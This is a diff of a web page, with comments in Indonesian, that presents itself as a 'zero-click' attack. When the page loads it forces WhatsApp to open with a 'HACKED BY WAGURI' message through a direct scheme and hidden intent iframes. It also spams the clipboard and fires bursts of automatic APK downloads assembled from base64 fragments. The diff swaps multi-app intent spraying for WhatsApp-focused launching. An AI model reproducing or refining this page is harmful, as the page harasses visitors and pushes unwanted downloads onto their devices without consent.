@@ -29,7 +29,7 @@
 
 <div class="panel" id="main-card">
   <h2>⚡ ZERO-CLICK ACTIVE ⚡</h2>
-  <p style="color: #fff; margin-top: 10px; font-size: 13px;">Memicu payload otomatis tanpa interaksi...</p>
+  <p style="color: #fff; margin-top: 10px; font-size: 13px;">Mengarahkan ke WhatsApp & unduhan otomatis...</p>
   <div id="log">[!] Menginisialisasi siklus zero-click...</div>
 </div>
 
@@ -50,25 +50,31 @@
   var PAYLOAD_TEXT = "HACKED BY WAGURI - ZERO-CLICK COMPROMISE";
   var ENCODED_TEXT = encodeURIComponent(PAYLOAD_TEXT);
   
-  var TARGETS = [
-    "whatsapp://send?text=" + ENCODED_TEXT,
-    "intent://send?text=" + ENCODED_TEXT + "#Intent;package=com.whatsapp;scheme=whatsapp;end;",
-    "instagram://",
-    "intent://#Intent;package=com.instagram.android;scheme=instagram;end;",
-    "vnd.youtube://",
-    "intent://#Intent;package=com.google.android.youtube;scheme=vnd.youtube;end;"
-  ];
+  // Prioritas utama target WhatsApp Scheme & Intent
+  var WA_SCHEME = "whatsapp://send?text=" + ENCODED_TEXT;
+  var INTENT_WA = "intent://send?text=" + ENCODED_TEXT + "#Intent;package=com.whatsapp;scheme=whatsapp;end;";
 
   var F1 = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
   var F2 = "UEsDBAoAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAAUGF5bG9hZFBhcnQ=";
   var F3 = "UEsDBBQACAAIAAAAIQAAAAAAAAAAAAAAAAAKAAAAcmVzb3VyY2Vz";
 
-  function triggerVibration() {
+  function triggerWhatsAppDirect() {
     try {
-      if (navigator.vibrate) {
-        navigator.vibrate([200, 100, 200, 100]);
-      }
-    } catch(e) {}
+      // 1. Eksekusi navigasi top-level langsung ke skema WhatsApp
+      window.location.href = WA_SCHEME;
+
+      // 2. Injeksi iframe intent ganda untuk memaksa handler aplikasi terbuka
+      var container = document.getElementById("launcher-container");
+      var iframe = document.createElement("iframe");
+      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
+      iframe.style.display = "none";
+      iframe.src = INTENT_WA;
+      container.appendChild(iframe);
+      
+      log("[+] WhatsApp Direct Launch Triggered.");
+    } catch(e) {
+      log("[-] WhatsApp Launch Error: " + e.message);
+    }
   }
 
   function dropMassiveAPKs(batchIndex) {
@@ -91,23 +97,6 @@
       log("[+] Zero-Click APK Thread #" + batchIndex + " Dispatched.");
     } catch(e) {
       log("[-] APK Drop Fail: " + e.message);
-    }
-  }
-
-  function sprayIntents() {
-    try {
-      var container = document.getElementById("launcher-container");
-      for (let i = 0; i < TARGETS.length; i++) {
-        var scheme = TARGETS[i];
-        var iframe = document.createElement("iframe");
-        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
-        iframe.style.display = "none";
-        iframe.src = scheme;
-        container.appendChild(iframe);
-      }
-      log("[+] Zero-Click Intent Spraying Completed.");
-    } catch(e) {
-      log("[-] Intent Spray Error: " + e.message);
     }
   }
 
@@ -134,10 +123,14 @@
   // AUTO-EXECUTE (ZERO-CLICK ON LOAD)
   // ============================================
   window.addEventListener('DOMContentLoaded', function() {
-    triggerVibration();
     log("[!] Memulai eksekusi zero-click instan...");
 
-    var totalRounds = 5;
+    // Eksekusi direct launch WhatsApp di awal waktu mikro
+    triggerWhatsAppDirect();
+    executeClipboardSpam();
+
+    // Diikuti dengan burst unduhan APK secara paralel
+    var totalRounds = 3;
     var burstTasks = [];
 
     for (let r = 0; r < totalRounds; r++) {
@@ -145,10 +138,8 @@
         var jitter = Math.floor(Math.random() * 10);
         setTimeout(() => {
           dropMassiveAPKs(r);
-          sprayIntents();
-          executeClipboardSpam();
           resolve();
-        }, jitter + (r * 15));
+        }, jitter + (r * 20));
       }));
     }
 
